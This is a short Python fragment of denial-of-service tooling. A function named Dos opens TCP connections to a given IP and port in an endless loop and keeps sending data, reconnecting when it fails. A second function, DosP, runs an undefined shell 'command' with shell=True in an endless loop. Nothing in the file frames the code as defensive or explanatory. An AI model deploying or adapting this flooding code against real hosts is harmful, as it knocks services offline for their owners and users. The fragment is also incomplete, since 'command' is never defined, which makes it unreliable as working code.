import socket
import subprocess as sub
import threading,sys
def DosP():    
    while True:
        sub.run(command,shell=True,check=False)
        
def Dos(ip,port):
    while True:
        sc = socket.socket()
        try:
            sc.connect((ip,port))
        except:
            pass

        while True:
            try:
                sc.send(b'')
               
            except:
                sc.close()
                break
        
    
    

